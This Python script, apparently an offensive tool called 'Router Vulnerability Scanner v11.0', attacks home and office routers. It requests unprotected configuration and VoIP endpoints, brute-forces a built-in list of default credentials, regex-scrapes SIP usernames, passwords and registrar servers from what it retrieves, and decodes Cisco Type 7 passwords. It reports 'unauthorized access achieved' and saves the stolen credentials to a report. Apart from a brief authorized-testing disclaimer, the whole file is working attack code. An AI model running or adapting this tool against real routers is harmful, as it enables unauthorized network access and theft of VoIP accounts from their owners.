#!/usr/bin/env python3
"""
Router Vulnerability Scanner v11.0
Professional Router Penetration Testing and SIP Extraction Tool

Designed for security professionals to demonstrate router vulnerabilities
and extract SIP/VoIP configurations without authentication.

Features:
- Unauthenticated router configuration access
- Known vulnerability exploitation (CVE database)
- SIP/VoIP password extraction from live routers
- Default credential testing and bypass techniques
- Professional vulnerability assessment reporting
- POC-ready security demonstrations

LEGAL NOTICE: For authorized security testing only
Use only on equipment you own or have explicit permission to test
"""

import os
import sys
import re
import json
import argparse
import platform
import socket
import threading
import time
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
import urllib.request
import urllib.parse
from urllib.error import URLError

# Optional libraries
try:
    import requests
    from requests.auth import HTTPBasicAuth
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox, scrolledtext
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

class RouterVulnerabilityScanner:
    """Professional router vulnerability scanner and SIP extractor"""
    
    def __init__(self):
        self.version = "11.0 Penetration Testing Edition"
        
        # Known router vulnerabilities for unauthenticated access
        self.router_vulnerabilities = self._build_vulnerability_db()
        
        # Default credentials database
        self.default_credentials = self._build_credential_db()
        
        # SIP extraction endpoints for different router brands
        self.sip_endpoints = self._build_sip_endpoint_db()
        
        # Common router IP ranges
        self.common_ips = [
            '192.168.1.1', '192.168.0.1', '192.168.1.254', '192.168.0.254',
            '10.0.0.1', '10.0.1.1', '10.1.1.1', '172.16.0.1', '172.16.1.1'
        ]
        
        # Cisco Type 7 decryption
        self.cisco_type7_xlat = [
            0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e,
            0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44,
            0x48, 0x53, 0x55, 0x42, 0x73, 0x67, 0x76, 0x63, 0x61, 0x36, 0x39,
            0x38, 0x33, 0x34, 0x6e, 0x63, 0x78, 0x76, 0x39, 0x38, 0x37, 0x33,
            0x32, 0x35, 0x34, 0x6b, 0x3b, 0x66, 0x67, 0x38, 0x37
        ]
    
    def _build_vulnerability_db(self) -> Dict[str, Dict]:
        """Build database of known router vulnerabilities"""
        return {
            'unauthenticated_config_access': {
                'description': 'Direct configuration file access without authentication',
                'urls': [
                    '/cgi-bin/config.exp',
                    '/config.xml',
                    '/backup.conf',
                    '/settings.conf',
                    '/router.cfg',
                    '/system.cfg',
                    '/running-config',
                    '/startup-config'
                ],
                'methods': ['GET'],
                'indicators': ['hostname', 'interface', 'password']
            },
            'default_credential_bypass': {
                'description': 'Authentication bypass using default credentials',
                'credentials': [
                    ('admin', 'admin'), ('admin', 'password'), ('admin', ''),
                    ('root', 'root'), ('root', 'admin'), ('user', 'user'),
                    ('guest', 'guest'), ('', ''), ('cisco', 'cisco')
                ],
                'success_indicators': ['dashboard', 'configuration', 'system']
            },
            'information_disclosure': {
                'description': 'Information disclosure through unprotected endpoints',
                'urls': [
                    '/cgi-bin/info.cgi',
                    '/status.xml',
                    '/system-info',
                    '/device-info',
                    '/router-info.xml',
                    '/api/system/info',
                    '/admin/system_status.asp'
                ],
                'methods': ['GET'],
                'indicators': ['model', 'version', 'serial']
            },
            'sip_config_exposure': {
                'description': 'Exposed SIP/VoIP configuration endpoints',
                'urls': [
                    '/voip.xml',
                    '/sip.conf',
                    '/voice.cfg',
                    '/phone.xml',
                    '/cgi-bin/voip_config',
                    '/admin/voip.asp',
                    '/api/voip/config',
                    '/voice/config.xml'
                ],
                'methods': ['GET'],
                'indicators': ['sip', 'voip', 'username', 'password', 'registrar']
            }
        }
    
    def _build_credential_db(self) -> List[Tuple[str, str]]:
        """Build comprehensive default credential database"""
        return [
            # Most common
            ('admin', 'admin'), ('admin', 'password'), ('admin', ''),
            ('root', 'root'), ('root', 'admin'), ('root', ''),
            ('user', 'user'), ('guest', 'guest'), ('', ''),
            
            # Brand specific
            ('cisco', 'cisco'), ('admin', 'cisco'), ('cisco', 'admin'),
            ('admin', 'tplink'), ('admin', 'dlink'), ('admin', 'netcomm'),
            ('admin', '123456'), ('admin', 'admin123'), ('admin', 'Password1'),
            
            # Professional
            ('administrator', 'administrator'), ('admin', 'Admin123'),
            ('netadmin', 'netadmin'), ('sysadmin', 'sysadmin'),
            
            # Numerical
            ('admin', '1234'), ('admin', '12345'), ('admin', '123123')
        ]
    
    def _build_sip_endpoint_db(self) -> Dict[str, List[str]]:
        """Build SIP configuration endpoint database"""
        return {
            'cisco': [
                '/voice/config',
                '/cgi-bin/voice_config.cgi',
                '/admin/voice.html',
                '/voice.xml'
            ],
            'tplink': [
                '/userRpm/VoipConfigRpm.htm',
                '/cgi-bin/luci/admin/services/voip',
                '/voip.xml',
                '/phone.xml'
            ],
            'dlink': [
                '/voice.html',
                '/voip_config.html',
                '/admin/voip.asp',
                '/cgi-bin/voip.cgi'
            ],
            'netcomm': [
                '/voip.xml',
                '/phone.html',
                '/admin/voip.asp'
            ],
            'generic': [
                '/voip', '/sip', '/voice', '/phone',
                '/voip.xml', '/sip.conf', '/voice.cfg',
                '/admin/voip', '/config/voip', '/settings/sip'
            ]
        }
    
    def scan_router_vulnerabilities(self, target_ip: str, verbose: bool = False) -> Dict[str, Any]:
        """Scan router for vulnerabilities and extract SIP configuration"""
        print("üî• Router Vulnerability Scanner v11.0")
        print("üïµÔ∏è Professional Penetration Testing and SIP Extraction")
        print("=" * 80)
        print(f"üéØ Target: {target_ip}")
        print("")
        
        scan_result = {
            'target_ip': target_ip,
            'vulnerabilities_found': [],
            'authentication_bypassed': False,
            'sip_config_extracted': False,
            'sip_accounts': [],
            'router_info': {},
            'success': False,
            'poc_value': 'none'
        }
        
        # Step 1: Basic connectivity check
        print("üîç Step 1: Target connectivity assessment...")
        if not self._check_connectivity(target_ip):
            scan_result['error'] = f'Target {target_ip} is not reachable'
            print(f"‚ùå Target {target_ip} is not reachable")
            return scan_result
        
        print(f"‚úÖ Target {target_ip} is reachable")
        
        # Step 2: Router identification
        print("üîç Step 2: Router identification and fingerprinting...")
        router_info = self._identify_router(target_ip, verbose)
        scan_result['router_info'] = router_info
        
        if router_info['identified']:
            print(f"‚úÖ Router identified: {router_info['brand'].upper()} {router_info.get('model', '')}")
        else:
            print("‚ö†Ô∏è Router brand not identified - using generic methods")
        
        # Step 3: Vulnerability scanning
        print("üîç Step 3: Vulnerability assessment...")
        vulnerabilities = self._scan_vulnerabilities(target_ip, router_info, verbose)
        scan_result['vulnerabilities_found'] = vulnerabilities
        
        print(f"üìä Found {len(vulnerabilities)} potential vulnerabilities")
        
        # Step 4: Attempt unauthenticated configuration access
        print("üîç Step 4: Attempting unauthenticated configuration access...")
        config_access = self._attempt_unauthenticated_access(target_ip, router_info, verbose)
        
        if config_access['success']:
            scan_result['authentication_bypassed'] = True
            scan_result['config_content'] = config_access['content']
            print("‚úÖ Unauthenticated configuration access successful!")
            
            # Extract SIP from configuration
            sip_extraction = self._extract_sip_from_config(config_access['content'], verbose)
            if sip_extraction['found']:
                scan_result['sip_config_extracted'] = True
                scan_result['sip_accounts'] = sip_extraction['accounts']
                scan_result['success'] = True
                scan_result['poc_value'] = 'high'
                print(f"üéØ SIP configuration extracted: {len(sip_extraction['accounts'])} accounts")
            else:
                scan_result['poc_value'] = 'medium'
                print("‚ö†Ô∏è No SIP configuration found in extracted config")
        else:
            print("‚ùå Could not access configuration without authentication")
        
        # Step 5: Default credential testing (fallback)
        if not scan_result['authentication_bypassed']:
            print("üîç Step 5: Default credential testing...")
            auth_result = self._test_default_credentials(target_ip, router_info, verbose)
            
            if auth_result['success']:
                scan_result['authentication_bypassed'] = True
                scan_result['credentials_used'] = auth_result['credentials']
                print(f"‚úÖ Authentication successful: {auth_result['credentials'][0]}/{auth_result['credentials'][1]}")
                
                # Extract SIP with authentication
                sip_extraction = self._extract_sip_with_auth(target_ip, auth_result['credentials'], router_info, verbose)
                if sip_extraction['found']:
                    scan_result['sip_config_extracted'] = True
                    scan_result['sip_accounts'] = sip_extraction['accounts']
                    scan_result['success'] = True
                    scan_result['poc_value'] = 'high'
                    print(f"üéØ SIP configuration extracted with auth: {len(sip_extraction['accounts'])} accounts")
        
        return scan_result
    
    def _check_connectivity(self, ip: str) -> bool:
        """Check if target is reachable"""
        try:
            if platform.system().lower() == 'windows':
                result = subprocess.run(['ping', '-n', '1', '-w', '2000', ip], 
                                      capture_output=True, timeout=5)
            else:
                result = subprocess.run(['ping', '-c', '1', '-W', '2', ip], 
                                      capture_output=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def _identify_router(self, ip: str, verbose: bool) -> Dict[str, Any]:
        """Identify router brand and model"""
        router_info = {
            'identified': False,
            'brand': 'unknown',
            'model': 'unknown',
            'web_accessible': False,
            'https_available': False
        }
        
        # Try to access web interface
        for protocol in ['http', 'https']:
            try:
                url = f"{protocol}://{ip}"
                
                if REQUESTS_AVAILABLE:
                    response = requests.get(url, timeout=5, verify=False)
                    content = response.text.lower()
                else:
                    # Fallback
                    request = urllib.request.Request(url)
                    response = urllib.request.urlopen(request, timeout=5)
                    content = response.read().decode('utf-8', errors='ignore').lower()
                
                router_info['web_accessible'] = True
                if protocol == 'https':
                    router_info['https_available'] = True
                
                # Identify brand from content
                brand_signatures = {
                    'cisco': ['cisco', 'ios', 'catalyst'],
                    'tplink': ['tp-link', 'tl-', 'archer'],
                    'dlink': ['d-link', 'dir-', 'di-'],
                    'netcomm': ['netcomm', 'nf-', 'nl-'],
                    'asus': ['asus', 'rt-', 'asuswrt'],
                    'netgear': ['netgear', 'r6000', 'r7000'],
                    'linksys': ['linksys', 'wrt', 'ea-'],
                    'mikrotik': ['mikrotik', 'routeros', 'winbox']
                }
                
                for brand, signatures in brand_signatures.items():
                    for signature in signatures:
                        if signature in content:
                            router_info['brand'] = brand
                            router_info['identified'] = True
                            break
                    if router_info['identified']:
                        break
                
                # Extract model information
                model_patterns = [
                    r'model[:\s]*([a-zA-Z0-9\-]+)',
                    r'product[:\s]*([a-zA-Z0-9\-]+)',
                    r'device[:\s]*([a-zA-Z0-9\-]+)'
                ]
                
                for pattern in model_patterns:
                    match = re.search(pattern, content)
                    if match:
                        router_info['model'] = match.group(1)
                        break
                
                break  # Found working protocol
                
            except Exception as e:
                if verbose:
                    print(f"      {protocol.upper()} access failed: {e}")
                continue
        
        return router_info
    
    def _scan_vulnerabilities(self, ip: str, router_info: Dict, verbose: bool) -> List[Dict[str, Any]]:
        """Scan for known router vulnerabilities"""
        vulnerabilities_found = []
        
        for vuln_name, vuln_info in self.router_vulnerabilities.items():
            if verbose:
                print(f"   Testing {vuln_name}...")
            
            vuln_result = self._test_vulnerability(ip, vuln_info, verbose)
            if vuln_result['vulnerable']:
                vulnerabilities_found.append({
                    'name': vuln_name,
                    'description': vuln_info['description'],
                    'severity': vuln_result.get('severity', 'medium'),
                    'exploit_url': vuln_result.get('exploit_url', ''),
                    'evidence': vuln_result.get('evidence', '')
                })
                
                if verbose:
                    print(f"      ‚úÖ Vulnerable to {vuln_name}")
        
        return vulnerabilities_found
    
    def _test_vulnerability(self, ip: str, vuln_info: Dict, verbose: bool) -> Dict[str, Any]:
        """Test specific vulnerability"""
        result = {'vulnerable': False}
        
        # Test URLs for this vulnerability
        for url_path in vuln_info.get('urls', []):
            full_url = f"http://{ip}{url_path}"
            
            try:
                if REQUESTS_AVAILABLE:
                    response = requests.get(full_url, timeout=5)
                    content = response.text
                    status_code = response.status_code
                else:
                    response = urllib.request.urlopen(full_url, timeout=5)
                    content = response.read().decode('utf-8', errors='ignore')
                    status_code = response.status
                
                # Check for vulnerability indicators
                indicators = vuln_info.get('indicators', [])
                found_indicators = sum(1 for indicator in indicators if indicator.lower() in content.lower())
                
                if status_code == 200 and found_indicators >= 2:
                    result = {
                        'vulnerable': True,
                        'exploit_url': full_url,
                        'evidence': content[:500],  # First 500 chars as evidence
                        'severity': 'high' if found_indicators >= 3 else 'medium'
                    }
                    break
            
            except Exception:
                continue
        
        return result
    
    def _attempt_unauthenticated_access(self, ip: str, router_info: Dict, verbose: bool) -> Dict[str, Any]:
        """Attempt unauthenticated configuration access"""
        access_result = {'success': False, 'content': '', 'method': ''}
        
        # Try unauthenticated configuration endpoints
        config_endpoints = [
            '/cgi-bin/config.exp',
            '/config.xml',
            '/backup.conf',
            '/settings.conf',
            '/router.cfg',
            '/running-config',
            '/startup-config',
            '/system.cfg',
            '/admin/config.xml',
            '/cgi-bin/backup.cgi'
        ]
        
        for endpoint in config_endpoints:
            try:
                url = f"http://{ip}{endpoint}"
                
                if verbose:
                    print(f"      Trying: {endpoint}")
                
                if REQUESTS_AVAILABLE:
                    response = requests.get(url, timeout=5)
                    content = response.text
                else:
                    response = urllib.request.urlopen(url, timeout=5)
                    content = response.read().decode('utf-8', errors='ignore')
                
                # Check if content looks like configuration
                if self._is_router_config(content):
                    access_result = {
                        'success': True,
                        'content': content,
                        'method': f'unauthenticated_access_{endpoint}',
                        'url': url
                    }
                    
                    if verbose:
                        print(f"         ‚úÖ Configuration accessed!")
                    break
            
            except Exception as e:
                if verbose:
                    print(f"         Failed: {e}")
                continue
        
        return access_result
    
    def _test_default_credentials(self, ip: str, router_info: Dict, verbose: bool) -> Dict[str, Any]:
        """Test default credentials"""
        auth_result = {'success': False, 'credentials': None}
        
        # Try common login URLs
        login_urls = [
            f"http://{ip}/",
            f"http://{ip}/login.html",
            f"http://{ip}/admin/",
            f"http://{ip}/cgi-bin/login"
        ]
        
        for username, password in self.default_credentials:
            if verbose:
                print(f"      Trying credentials: {username}/{password}")
            
            for login_url in login_urls:
                try:
                    if REQUESTS_AVAILABLE:
                        # Try HTTP Basic Auth
                        response = requests.get(login_url, auth=HTTPBasicAuth(username, password), timeout=5)
                        
                        # Check for successful authentication
                        if (response.status_code == 200 and 
                            'unauthorized' not in response.text.lower() and
                            'login' not in response.url.lower()):
                            
                            auth_result = {
                                'success': True,
                                'credentials': (username, password),
                                'login_url': login_url,
                                'session': requests.Session()
                            }
                            
                            # Set up session with credentials
                            auth_result['session'].auth = HTTPBasicAuth(username, password)
                            
                            return auth_result
                    
                    else:
                        # Fallback method
                        # Create password manager
                        password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
                        password_mgr.add_password(None, login_url, username, password)
                        
                        auth_handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
                        opener = urllib.request.build_opener(auth_handler)
                        
                        response = opener.open(login_url, timeout=5)
                        
                        if response.status == 200:
                            auth_result = {
                                'success': True,
                                'credentials': (username, password),
                                'login_url': login_url
                            }
                            return auth_result
                
                except Exception:
                    continue
            
            # Break early if found
            if auth_result['success']:
                break
        
        return auth_result
    
    def _extract_sip_with_auth(self, ip: str, credentials: Tuple[str, str], router_info: Dict, verbose: bool) -> Dict[str, Any]:
        """Extract SIP configuration with authentication"""
        sip_result = {'found': False, 'accounts': []}
        
        username, password = credentials
        brand = router_info.get('brand', 'generic')
        
        # Get SIP endpoints for this brand
        endpoints = self.sip_endpoints.get(brand, self.sip_endpoints['generic'])
        
        for endpoint in endpoints:
            try:
                url = f"http://{ip}{endpoint}"
                
                if verbose:
                    print(f"         Checking SIP endpoint: {endpoint}")
                
                if REQUESTS_AVAILABLE:
                    response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
                    content = response.text
                else:
                    # Fallback
                    password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
                    password_mgr.add_password(None, url, username, password)
                    
                    auth_handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
                    opener = urllib.request.build_opener(auth_handler)
                    
                    response = opener.open(url, timeout=5)
                    content = response.read().decode('utf-8', errors='ignore')
                
                # Extract SIP accounts from content
                sip_accounts = self._parse_sip_from_web_content(content, brand)
                
                if sip_accounts:
                    sip_result['found'] = True
                    sip_result['accounts'].extend(sip_accounts)
                    
                    if verbose:
                        print(f"            ‚úÖ Found {len(sip_accounts)} SIP accounts")
            
            except Exception as e:
                if verbose:
                    print(f"            Failed: {e}")
                continue
        
        return sip_result
    
    def _parse_sip_from_web_content(self, content: str, brand: str) -> List[Dict[str, Any]]:
        """Parse SIP accounts from web interface content"""
        sip_accounts = []
        
        # SIP extraction patterns
        sip_patterns = [
            # Username patterns
            (r'sip[._\s]*username[=:\s]*["\']?([^"\'>\s\n]+)', 'username'),
            (r'voip[._\s]*username[=:\s]*["\']?([^"\'>\s\n]+)', 'username'),
            (r'account[._\s]*username[=:\s]*["\']?([^"\'>\s\n]+)', 'username'),
            (r'user[._\s]*id[=:\s]*["\']?([^"\'>\s\n]+)', 'username'),
            
            # Password patterns
            (r'sip[._\s]*password[=:\s]*["\']?([^"\'>\s\n]+)', 'password'),
            (r'voip[._\s]*password[=:\s]*["\']?([^"\'>\s\n]+)', 'password'),
            (r'account[._\s]*password[=:\s]*["\']?([^"\'>\s\n]+)', 'password'),
            (r'auth[._\s]*password[=:\s]*["\']?([^"\'>\s\n]+)', 'password'),
            
            # Server patterns
            (r'sip[._\s]*server[=:\s]*["\']?([^"\'>\s\n]+)', 'server'),
            (r'registrar[=:\s]*["\']?([^"\'>\s\n]+)', 'server'),
            (r'proxy[=:\s]*["\']?([^"\'>\s\n]+)', 'server'),
            (r'outbound[._\s]*proxy[=:\s]*["\']?([^"\'>\s\n]+)', 'server'),
            
            # Cisco Type 7 in VoIP context
            (r'password\s+7\s+([A-Fa-f0-9]+)', 'cisco_type7')
        ]
        
        for pattern, sip_type in sip_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            
            for match in matches:
                if len(match) > 2:
                    account_info = {
                        'type': sip_type,
                        'value': match,
                        'source': f'{brand}_web_interface'
                    }
                    
                    # Handle Cisco Type 7 passwords
                    if sip_type == 'cisco_type7':
                        decrypted = self._decrypt_cisco_type7(match)
                        account_info['encrypted'] = match
                        account_info['decrypted'] = decrypted
                        account_info['type'] = 'password'
                    
                    sip_accounts.append(account_info)
        
        return sip_accounts
    
    def _is_router_config(self, content: str) -> bool:
        """Check if content looks like router configuration"""
        config_indicators = [
            'interface', 'hostname', 'router', 'version', 'ip address',
            'enable', 'username', 'password', 'access-list', 'vlan'
        ]
        
        content_lower = content.lower()
        found_indicators = sum(1 for indicator in config_indicators if indicator in content_lower)
        
        return found_indicators >= 3
    
    def _extract_sip_from_config(self, config_content: str, verbose: bool) -> Dict[str, Any]:
        """Extract SIP configuration from router config"""
        sip_result = {'found': False, 'accounts': []}
        
        # Look for SIP/VoIP sections in configuration
        sip_sections = [
            'voice register pool',
            'dial-peer voice',
            'sip-ua',
            'voice-port',
            'voip',
            'sip'
        ]
        
        lines = config_content.split('\n')
        in_sip_section = False
        current_account = {}
        
        for line in lines:
            line = line.strip()
            line_lower = line.lower()
            
            # Check if entering SIP section
            if any(section in line_lower for section in sip_sections):
                in_sip_section = True
                current_account = {'source': 'unauthenticated_config'}
                continue
            
            # Check if leaving SIP section
            if in_sip_section and (line.startswith('!') or line == ''):
                if current_account and len(current_account) > 1:
                    sip_result['accounts'].append(current_account)
                    sip_result['found'] = True
                current_account = {'source': 'unauthenticated_config'}
                in_sip_section = False
                continue
            
            # Extract SIP information from current line
            if in_sip_section or any(keyword in line_lower for keyword in ['sip', 'voip', 'voice']):
                # Username/ID extraction
                username_patterns = [
                    r'id\s+([^\s\n]+)',
                    r'number\s+([^\s\n]+)',
                    r'username\s+([^\s\n]+)',
                    r'account\s+([^\s\n]+)'
                ]
                
                for pattern in username_patterns:
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        current_account['username'] = match.group(1)
                        break
                
                # Password extraction
                password_patterns = [
                    r'password\s+([^\s\n]+)',
                    r'password\s+7\s+([A-Fa-f0-9]+)',
                    r'secret\s+([^\s\n]+)',
                    r'auth\s+([^\s\n]+)'
                ]
                
                for pattern in password_patterns:
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        if 'password 7' in line:
                            # Cisco Type 7 password
                            encrypted = match.group(1)
                            decrypted = self._decrypt_cisco_type7(encrypted)
                            current_account['password_encrypted'] = encrypted
                            current_account['password'] = decrypted
                        else:
                            current_account['password'] = match.group(1)
                        break
                
                # Server extraction
                server_patterns = [
                    r'registrar\s+([^\s\n]+)',
                    r'proxy\s+([^\s\n]+)',
                    r'server\s+([^\s\n]+)'
                ]
                
                for pattern in server_patterns:
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        current_account['server'] = match.group(1)
                        break
        
        # Add final account if exists
        if current_account and len(current_account) > 1:
            sip_result['accounts'].append(current_account)
            sip_result['found'] = True
        
        return sip_result
    
    def _decrypt_cisco_type7(self, password: str) -> str:
        """Decrypt Cisco Type 7 password"""
        try:
            if len(password) < 4:
                return "Invalid length"
            
            salt = int(password[:2])
            encrypted_text = password[2:]
            encrypted_bytes = bytes.fromhex(encrypted_text)
            
            decrypted = ""
            for i, byte in enumerate(encrypted_bytes):
                key_index = (salt + i) % len(self.cisco_type7_xlat)
                decrypted += chr(byte ^ self.cisco_type7_xlat[key_index])
            
            return decrypted
        except Exception:
            return "Decryption failed"
    
    def generate_vulnerability_report(self, result: Dict[str, Any]) -> str:
        """Generate professional vulnerability assessment report"""
        report = []
        
        # Header
        report.append("=" * 100)
        report.append("ROUTER VULNERABILITY ASSESSMENT AND SIP EXTRACTION REPORT")
        report.append("Professional Network Security Analysis and Penetration Testing")
        report.append("=" * 100)
        report.append(f"Assessment Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Target: {result.get('target_ip', 'Unknown')}")
        report.append(f"Tool: Router Vulnerability Scanner v{self.version}")
        report.append("")
        
        # Executive Summary
        report.append("üéØ EXECUTIVE SUMMARY")
        report.append("-" * 60)
        
        if result.get('success'):
            report.append("‚úÖ PENETRATION TEST: SUCCESSFUL")
            report.append("‚úÖ SIP EXTRACTION: SUCCESSFUL")
            report.append(f"SIP Accounts Found: {len(result.get('sip_accounts', []))}")
            report.append("Security Risk: HIGH - Unauthorized access achieved")
        elif result.get('authentication_bypassed'):
            report.append("‚úÖ PENETRATION TEST: PARTIAL SUCCESS")
            report.append("‚ö†Ô∏è SIP EXTRACTION: NO SIP DATA FOUND")
            report.append("Security Risk: MEDIUM - Unauthorized access achieved")
        else:
            report.append("‚ùå PENETRATION TEST: ACCESS DENIED")
            report.append("Security Status: SECURE - No unauthorized access")
        
        report.append("")
        
        # Router Information
        router_info = result.get('router_info', {})
        if router_info:
            report.append("üñ•Ô∏è TARGET ROUTER INFORMATION")
            report.append("-" * 60)
            report.append(f"Brand: {router_info.get('brand', 'Unknown').upper()}")
            report.append(f"Model: {router_info.get('model', 'Unknown')}")
            report.append(f"Web Interface: {'Accessible' if router_info.get('web_accessible') else 'Not Accessible'}")
            report.append(f"HTTPS Support: {'Yes' if router_info.get('https_available') else 'No'}")
            report.append("")
        
        # Vulnerability Assessment
        vulnerabilities = result.get('vulnerabilities_found', [])
        if vulnerabilities:
            report.append(f"üõ°Ô∏è SECURITY VULNERABILITIES ({len(vulnerabilities)})")
            report.append("-" * 60)
            
            for i, vuln in enumerate(vulnerabilities, 1):
                report.append(f"{i}. {vuln['name'].upper()}")
                report.append(f"   Description: {vuln['description']}")
                report.append(f"   Severity: {vuln['severity'].upper()}")
                if vuln.get('exploit_url'):
                    report.append(f"   Exploit URL: {vuln['exploit_url']}")
                report.append("")
        
        # Authentication Results
        if result.get('authentication_bypassed'):
            report.append("üîì AUTHENTICATION BYPASS")
            report.append("-" * 60)
            
            if result.get('credentials_used'):
                creds = result['credentials_used']
                report.append(f"Method: Default Credentials")
                report.append(f"Credentials: {creds[0]}/{creds[1]}")
            else:
                report.append("Method: Unauthenticated Access")
                report.append("No credentials required")
            
            report.append("Risk: HIGH - Unauthorized access to router configuration")
            report.append("")
        
        # SIP Configuration Results
        sip_accounts = result.get('sip_accounts', [])
        if sip_accounts:
            report.append(f"üìû SIP/VOIP CONFIGURATION EXTRACTED ({len(sip_accounts)})")
            report.append("-" * 60)
            
            # Group SIP data
            usernames = [acc for acc in sip_accounts if acc['type'] == 'username']
            passwords = [acc for acc in sip_accounts if acc['type'] == 'password']
            servers = [acc for acc in sip_accounts if acc['type'] == 'server']
            
            if usernames:
                report.append("SIP Usernames:")
                for acc in usernames:
                    report.append(f"  ‚Ä¢ {acc['value']}")
                report.append("")
            
            if passwords:
                report.append("SIP Passwords:")
                for acc in passwords:
                    if acc.get('decrypted'):
                        report.append(f"  ‚Ä¢ {acc['decrypted']} (decrypted from {acc.get('encrypted', 'N/A')})")
                    else:
                        report.append(f"  ‚Ä¢ {acc['value']}")
                report.append("")
            
            if servers:
                report.append("SIP Servers:")
                for acc in servers:
                    report.append(f"  ‚Ä¢ {acc['value']}")
                report.append("")
        
        # POC Value Assessment
        report.append("üéØ POC DEMONSTRATION VALUE")
        report.append("-" * 60)
        
        poc_value = result.get('poc_value', 'none')
        
        if poc_value == 'high':
            report.append("‚úÖ EXCELLENT POC VALUE")
            report.append("‚Ä¢ Demonstrated unauthorized router access")
            report.append("‚Ä¢ Successfully extracted SIP/VoIP credentials")
            report.append("‚Ä¢ Shows critical security vulnerabilities")
            report.append("‚Ä¢ Perfect for client security assessment presentation")
        elif poc_value == 'medium':
            report.append("‚ö†Ô∏è GOOD POC VALUE")
            report.append("‚Ä¢ Demonstrated unauthorized router access")
            report.append("‚Ä¢ Shows router configuration vulnerabilities")
            report.append("‚Ä¢ Valuable for security assessment presentation")
        else:
            report.append("‚ÑπÔ∏è EDUCATIONAL POC VALUE")
            report.append("‚Ä¢ Router appears properly secured")
            report.append("‚Ä¢ No unauthorized access achieved")
            report.append("‚Ä¢ Shows importance of proper security configuration")
        
        # Security Recommendations
        report.append("")
        report.append("üí° SECURITY RECOMMENDATIONS")
        report.append("-" * 60)
        
        if result.get('authentication_bypassed'):
            report.append("CRITICAL SECURITY ISSUES IDENTIFIED:")
            report.append("1. Change default administrator credentials immediately")
            report.append("2. Disable unnecessary web services and endpoints")
            report.append("3. Enable strong authentication mechanisms")
            report.append("4. Restrict administrative access to trusted networks")
            report.append("5. Regularly update router firmware")
            report.append("6. Monitor for unauthorized access attempts")
        else:
            report.append("SECURITY POSTURE: ACCEPTABLE")
            report.append("1. Continue monitoring for new vulnerabilities")
            report.append("2. Maintain current security configurations")
            report.append("3. Regular security assessments recommended")
        
        # Footer
        report.append("")
        report.append("=" * 100)
        report.append("Router Vulnerability Scanner v11.0")
        report.append("Professional Network Security Assessment Tool")
        report.append("FOR AUTHORIZED SECURITY TESTING ONLY")
        report.append("=" * 100)
        
        return '\n'.join(report)


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='Router Vulnerability Scanner v11.0 - Professional Penetration Testing',
        epilog="""
üïµÔ∏è PROFESSIONAL PENETRATION TESTING:
Test router security and extract SIP configurations without authentication.
Perfect for POC security demonstrations.

USAGE:
  python router_vulnerability_scanner.py 192.168.1.1 -v
  python router_vulnerability_scanner.py 10.0.0.1 --report security_assessment.txt
  python router_vulnerability_scanner.py --password "094F471A1A0A"

‚ö†Ô∏è LEGAL NOTICE:
Use only on equipment you own or have explicit authorization to test.
        """
    )
    
    parser.add_argument('target_ip', nargs='?', help='Router IP address to test')
    parser.add_argument('-p', '--password', help='Decrypt Cisco Type 7 password')
    parser.add_argument('-r', '--report', help='Generate security assessment report')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose penetration testing output')
    parser.add_argument('--json', action='store_true', help='JSON output format')
    
    args = parser.parse_args()
    
    scanner = RouterVulnerabilityScanner()
    
    # Password decryption
    if args.password:
        decrypted = scanner._decrypt_cisco_type7(args.password)
        print(f"üîë Encrypted: {args.password}")
        print(f"üîì Decrypted: {decrypted}")
        return
    
    # Vulnerability scanning
    if not args.target_ip:
        print("Router Vulnerability Scanner v11.0")
        print("Usage: python router_vulnerability_scanner.py <router_ip>")
        print("Example: python router_vulnerability_scanner.py 192.168.1.1 -v")
        print("")
        print("For POC demonstration:")
        print("  python router_vulnerability_scanner.py 192.168.1.1 --report poc_security.txt")
        return
    
    # Validate IP address
    try:
        socket.inet_aton(args.target_ip)
    except socket.error:
        print(f"‚ùå Invalid IP address: {args.target_ip}")
        return
    
    # Perform vulnerability scan
    result = scanner.scan_router_vulnerabilities(args.target_ip, args.verbose)
    
    # Output results
    if args.json:
        print(json.dumps(result, indent=2, default=str))
    else:
        report = scanner.generate_vulnerability_report(result)
        print(report)
    
    # Save report
    if args.report:
        report = scanner.generate_vulnerability_report(result)
        with open(args.report, 'w', encoding='utf-8') as f:
            f.write(report)
        print(f"\nüîí Security assessment report saved: {args.report}")
    
    # Final summary
    if result['success']:
        print(f"\nüéâ PENETRATION TEST SUCCESSFUL!")
        print(f"üîì Unauthorized access achieved")
        print(f"üìû SIP accounts extracted: {len(result.get('sip_accounts', []))}")
        print(f"üéØ Perfect for POC security demonstration!")
    elif result.get('authentication_bypassed'):
        print(f"\n‚ö†Ô∏è SECURITY VULNERABILITY CONFIRMED!")
        print(f"üîì Router access achieved with default credentials")
        print(f"üéØ Good POC value for security assessment")
    else:
        print(f"\n‚úÖ ROUTER APPEARS SECURE")
        print(f"üõ°Ô∏è No unauthorized access achieved")
        print(f"üìã Security posture appears acceptable")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nüî• PENETRATION TEST TERMINATED")
    except Exception as e:
        print(f"\nüí• ERROR: {e}")
        sys.exit(1)